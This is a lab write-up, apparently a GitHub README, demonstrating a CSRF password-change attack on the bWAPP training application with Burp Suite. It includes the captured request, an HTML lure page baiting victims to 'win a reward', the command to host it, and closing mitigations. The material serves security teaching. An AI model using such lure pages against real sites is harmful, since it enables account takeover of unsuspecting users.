# bWAPP-CSRF-Attack
CSRF attack demonstration on bWAPP using Burp Suite and Kali Linux
# 🐝 CSRF Attack on bWAPP

## 🔐 Overview

This project demonstrates a **Cross-Site Request Forgery (CSRF)** attack on the bWAPP vulnerable web application.
The attack allows changing a user’s password **without their consent** by exploiting the lack of CSRF protection.

---

## 🎯 Objective

* Understand how CSRF works
* Capture and analyze HTTP requests using Burp Suite
* Craft a malicious request to perform unauthorized actions

---

## ⚙️ Lab Environment

* Attacker Machine: Kali Linux
* Target: bWAPP (BeeBox)
* Tools:

  * Burp Suite
  * FoxyProxy
  * Python HTTP Server

---

## 🚀 Attack Steps

### 1. Access Target

* Login to bWAPP:

  * Username: `bee`
  * Password: `bug`
* Set security level to **Low**

---

### 2. Capture Request

* Enable FoxyProxy
* Turn ON Burp Suite Intercept
* Change password in bWAPP
* Capture request:

```
GET /bWAPP/csrf_1.php?password_new=yo&password_conf=yo&action=change
```

---

### 3. Craft Malicious Link

```html
<h1>YOU KNOW THE GAME</h1>

<p>
Click 
<a href="http://<beebox-ip>/bWAPP/csrf_1.php?password_new=yo&password_conf=yo&action=change">
here
</a> to win a reward!
</p>
```

---

### 4. Host Attack Page

```bash
python3 -m http.server 80
```

---

### 5. Execute Attack

* Victim visits malicious page
* Clicks link
* Password changes automatically

---

## 📸 Screenshots
<img width="780" height="535" alt="image" src="https://github.com/user-attachments/assets/5ad9a913-87ea-41d2-8d4d-c19eca2f63cd" />
<img width="778" height="277" alt="image" src="https://github.com/user-attachments/assets/dd6a626a-dd6e-41cd-bd71-d2d4163f0f0e" />


<img width="1913" height="852" alt="image" src="https://github.com/user-attachments/assets/16dfdee1-ddba-4c0b-abe8-7db897fa88e9" />

---

## ⚠️ Vulnerability

The application does not use **CSRF tokens**, allowing unauthorized requests to be executed.

---

## 🛡️ Mitigation

* Implement CSRF tokens
* Require re-authentication for sensitive actions
* Validate request origin (Referer/Origin headers)

---

## 📚 Key Learning

* CSRF exploits trust between browser and server
* Sensitive actions must be protected
* Even simple GET requests can be dangerous

---

## 👩‍💻 Author

Rafia Tasnim
Cybersecurity | Ethical Hacking
